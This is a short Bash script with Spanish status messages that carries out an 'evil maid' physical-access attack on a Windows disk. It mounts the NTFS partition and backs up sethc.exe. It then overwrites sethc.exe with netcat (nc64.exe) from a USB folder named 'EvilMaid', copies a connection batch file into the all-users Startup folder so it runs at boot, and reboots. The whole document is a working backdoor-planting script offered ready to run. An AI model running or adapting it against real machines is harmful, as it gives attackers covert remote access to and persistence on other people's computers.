#!/bin/bash

echo "********************************************"
echo "*         INICIANDO PROCESO DE MONTAJE     *"
echo "********************************************"

cd /mnt/
echo "[OK] Directorio cambiado a /mnt/"

echo "--------------------------------------------"
echo "Montando disco NTFS..."
mount sda1/
echo "[OK] Disco NTFS montado exitosamente."

echo "********************************************"
echo "*       RESPALDANDO ARCHIVO SETHC.EXE      *"
echo "********************************************"

cp -r /mnt/sda1/Windows/System32/sethc.exe /mnt/sda1/Windows/System32/sethc.exe.orig
echo "[OK] Respaldo de sethc.exe completado. Guardado como sethc.exe.orig"

echo "********************************************"
echo "*       REEMPLAZANDO ARCHIVO SETHC.EXE     *"
echo "********************************************"

cp -r /mnt/sdb1/EvilMaid/nc64.exe /mnt/sda1/Windows/System32/sethc.exe
echo "[OK] Netcat (nc64.exe) copiado en System32 como sethc.exe"

echo "********************************************"
echo "*      COPIANDO SCRIPT DE INICIO           *"
echo "********************************************"

cp -r /mnt/sdb1/EvilMaid/conexionEM.bat /mnt/sda1/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp/conexionEM.bat
echo "[OK] Script de inicio copiado correctamente."

echo "********************************************"
echo "*         REINICIANDO EL SISTEMA...        *"
echo "********************************************"

sudo reboot
echo "[OK] Reinicio en progreso..."
